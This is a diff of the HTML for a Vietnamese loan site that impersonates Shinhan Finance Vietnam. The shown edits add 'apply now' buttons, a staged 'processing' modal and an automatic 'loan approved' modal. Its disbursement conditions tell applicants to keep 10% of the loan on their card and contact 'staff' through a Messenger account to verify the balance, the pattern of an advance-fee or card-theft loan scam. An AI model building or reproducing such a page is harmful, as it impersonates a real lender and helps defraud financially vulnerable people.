-        <p>Dịch vụ chuyển tiền nhanh chóng, an toàn trong và ngoài nước với phí giao dịch cạnh tranh.</p>
-        <div class="section-details">
-            <p><strong>Mới:</strong> Miễn phí chuyển tiền quốc tế cho giao dịch đầu tiên qua Mobile Banking SOL.</p>
-            <img src="https://imgur.com/DbxKP8i.jpg" alt="Chuyển tiền" loading="lazy">
+            <p>Thành viên Shinhan Financial Group, từ 1993.</p>
+            <button onclick="scrollToRegister()">Đăng Ký Vay</button>
         </div>
     </section>
 
     <div class="support-buttons">
         <button class="support-btn call" title="Gọi Hotline" aria-label="Gọi hotline 19001577">📞</button>
-        <button class="support-btn chat" title="Chat Trực Tiếp" aria-label="Chat trực tiếp">💬</button>
-        <button class="support-btn messenger" title="Nhắn Tin qua Messenger" aria-label="Nhắn tin qua Messenger">📩</button>
+        <button class="support-btn messenger" title="Nhắn Tin qua Messenger" aria-label="Nhắn tin qua Messenger" onclick="window.open('https://m.me/shinhanfinancer', '_blank')">📩</button>
     </div>
 
     <button class="back-to-top" title="Quay lại đầu trang" aria-label="Quay lại đầu trang">↑</button>
 
     <footer>
         <p>Shinhan Finance Việt Nam | Hotline: <a href="tel:19001577">1900 1577</a> | Email: <a href="mailto:support@shinhan.vn">support@shinhan.vn</a></p>
-        <p>Địa chỉ: Tầng 1, Tòa nhà Leadvisors Place, 41A Lý Thái Tổ, Phường Lý Thái Tổ, Quận Hoàn Kiếm, TP. Hà Nội</p>
+        <p>Địa chỉ: Tầng 1, Leadvisors Place, 41A Lý Thái Tổ, Hoàn Kiếm, Hà Nội</p>
         <div class="social-links">
             <a href="https://www.facebook.com/shinhanfinancer/" aria-label="Facebook"><img src="./assets/images/facebook.png" alt="Facebook"></a>
             <a href="https://www.linkedin.com/company/shinhan-finance/" aria-label="LinkedIn"><img src="./assets/images/linkedin.png" alt="LinkedIn"></a>
         </div>
-        <div class="pwm-branches">
-            <h4>Chi nhánh Shinhan PWM</h4>
-            <ul>
-                <li>CN Sài Gòn: Tầng trệt, Tòa nhà MPlaza Saigon, số 39, Đường Lê Duẩn, Quận 1, TP.HCM</li>
-                <li>PGD Quận 7: Tầng 1 và 2, khu Phố Riverpark Residence, 339 đường Hà Huy Tập, Quận 7, TP.HCM</li>
-                <li>CN Lê Thái Tổ: 14 Lê Thái Tổ, Quận Hoàn Kiếm, Hà Nội</li>
-                <li>Liên hệ PWM: <a href="tel:1800599926">1800 5999 26</a></li>
-            </ul>
-            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.506216305928!2d105.85105531487584!3d21.030506985994755!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ab145bf0c683%3A0x6a076a5f3b9d8364!2sShinhan%20Bank!5e0!3m2!1sen!2s!4v1633021234567!5m2!1sen!2s" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" aria-label="Bản đồ chi nhánh"></iframe>
-        </div>
+        <button onclick="scrollToRegister()">Đăng Ký Vay Ngay</button>
         <p><a href="#privacy">Chính sách bảo mật</a> | <a href="#terms">Điều khoản sử dụng</a></p>
         <p>© 2025 Shinhan Finance</p>
     </footer>
 
-    <div class="modal" id="login-modal" aria-label="Đăng nhập">
-        <div class="modal-content auth-modal">
-            <h2>Đăng Nhập</h2>
-            <input type="text" placeholder="Tên đăng nhập" aria-label="Tên đăng nhập">
-            <input type="password" placeholder="Mật khẩu" aria-label="Mật khẩu">
-            <button>Đăng Nhập</button>
-        </div>
-    </div>
-
-    <div class="modal" id="register-modal" aria-label="Đăng ký">
-        <div class="modal-content auth-modal">
-            <h2>Đăng Ký</h2>
-            <input type="text" placeholder="Tên đăng nhập" aria-label="Tên đăng nhập">
-            <input type="email" placeholder="Email" aria-label="Email">
-            <input type="password" placeholder="Mật khẩu" aria-label="Mật khẩu">
-            <button>Đăng Ký</button>
-        </div>
-    </div>
-
     <div class="modal" id="confirm-modal" aria-label="Xác nhận thông tin vay">
         <div class="modal-content">
-            <h2>Xác Nhận Thông Tin Vay</h2>
-            <p>Hiển thị đang xét duyệt, vui lòng đợi.</p>
+            <h2 data-lang-vi="Xác Nhận Thông Tin Vay" data-lang-en="Confirm Loan Information">Xác Nhận Thông Tin Vay</h2>
+            <p data-lang-vi="Đang xét duyệt, vui lòng đợi..." data-lang-en="Processing, please wait...">Đang xét duyệt, vui lòng đợi...</p>
             <div class="loader"></div>
             <button disabled>Đang xử lý...</button>
         </div>
@@ -481,30 +294,22 @@
 
     <div class="modal" id="approval-modal" aria-label="Kết quả xét duyệt vay">
         <div class="modal-content">
-            <h2>Đã đủ điều kiện vay</h2>
-            <p>Hồ sơ của bạn đã được duyệt tại Shinhan Finance.</p>
-            <p class="profile-code">Mã hồ sơ: </p>
-            <div class="action-buttons">
-                <button id="view-profile">Xem Hồ Sơ</button>
-                <button id="disbursement-conditions">Nhận Về Tài Khoản</button>
-                <button id="contact-staff">Liên Hệ Nhân Viên</button>
-            </div>
+            <h2 data-lang-vi="Đã đủ điều kiện vay" data-lang-en="Loan Approved">Đã đủ điều kiện vay</h2>
+            <p data-lang-vi="Hồ sơ của bạn đã được duyệt!" data-lang-en="Your application has been approved!">Hồ sơ của bạn đã được duyệt!</p>
+            <p class="profile-code">Mã hồ sơ: <span id="profile-code"></span></p>
+            <button onclick="showContract()">Xem Hợp Đồng</button>
+            <button onclick="showDisbursementModal()">Điều Kiện Giải Ngân</button>
         </div>
-    </div>
-
-    <div class="modal" id="profile-modal" aria-label="Hồ sơ khách hàng">
-        <div class="modal-content"></div>
     </div>
 
     <div class="modal" id="disbursement-modal" aria-label="Điều kiện giải ngân">
         <div class="modal-content">
-            <h2>Điều Kiện Giải Ngân</h2>
-            <p>✔️ Khoản vay không thế chấp và không cần thẩm định nhà cửa, giúp bạn tiếp cận vốn nhanh chóng.</p>
-            <p>✔️ Ngân hàng yêu cầu 10% số dư trong tài khoản để chứng minh khả năng thu nhập và khả năng hoàn vốn. Số dư này chỉ cần để trong thẻ, không cần đóng, nạp, hay chuyển cho bất kỳ ai để được giải ngân.</p>
-            <p>✔️ Ví dụ: Vay 30 triệu thì số dư tối thiểu trong thẻ là 3 triệu.</p>
-            <p>✔️ Chỉ cần chụp ảnh qua nhân viên để hoàn tất hồ sơ, sau đó tiền sẽ được chuyển vào tài khoản ngân hàng của bạn.</p>
-            <p><strong>Chú ý:</strong> Số dư này không cần đóng hoặc chuyển cho bất kỳ ai. Nó chỉ cần có trong thẻ để chứng minh khả năng vay và chi trả cho ngân hàng, đảm bảo hồ sơ được duyệt.</p>
-            <p><strong>Sau khi đủ số dư:</strong> Vui lòng liên hệ nhân viên qua <a href="https://m.me/shinhanfinancer" target="_blank">Messenger</a> hoặc chi nhánh PWM: <a href="tel:1800599926">1800 5999 26</a>.</p>
+            <h2 data-lang-vi="Điều Kiện Giải Ngân" data-lang-en="Disbursement Conditions">Điều Kiện Giải Ngân</h2>
+            <p data-lang-vi="✔️ Khoản vay không thế chấp, không cần thẩm định tài sản." data-lang-en="✔️ No collateral or property appraisal required.">✔️ Khoản vay không thế chấp, không cần thẩm định tài sản.</p>
+            <p data-lang-vi="✔️ Cần số dư 10% khoản vay trong thẻ (ví dụ: vay 50 triệu, thẻ cần 5 triệu)." data-lang-en="✔️ 10% loan amount balance required in card (e.g., 5M VND for 50M VND loan).">✔️ Cần số dư 10% khoản vay trong thẻ (ví dụ: vay 50 triệu, thẻ cần 5 triệu).</p>
+            <p data-lang-vi="✔️ Không cần chuyển khoản hay đóng phí. Số dư chỉ để chứng minh khả năng tài chính." data-lang-en="✔️ No transfers or fees. Balance only for financial proof.">✔️ Không cần chuyển khoản hay đóng phí. Số dư chỉ để chứng minh khả năng tài chính.</p>
+            <p data-lang-vi="✔️ Liên hệ nhân viên qua Messenger (@shinhanfinancer) để xác minh số dư." data-lang-en="✔️ Contact staff via Messenger (@shinhanfinancer) to verify balance.">✔️ Liên hệ nhân viên qua Messenger (@shinhanfinancer) để xác minh số dư.</p>
+            <button onclick="window.open('https://m.me/shinhanfinancer', '_blank')">Liên Hệ Nhân Viên</button>
             <button onclick="closeModal('disbursement-modal')">Đóng</button>
         </div>
     </div>
